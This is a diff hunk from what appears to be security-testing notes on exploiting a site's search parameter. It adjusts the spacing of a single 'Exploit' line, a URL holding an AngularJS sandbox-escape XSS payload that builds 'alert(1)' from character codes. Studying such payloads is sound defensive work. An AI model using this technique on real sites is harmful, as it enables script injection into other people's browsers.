@@ -333,7 +333,7 @@ You Have a Search Funtion and search like asif and intercept the request and san
  
  ## Exploit 
  
-    example.com/?search=1&toString().constructor.prototype.charAt%3d[].join; [1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+    example.com/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
  
  
  
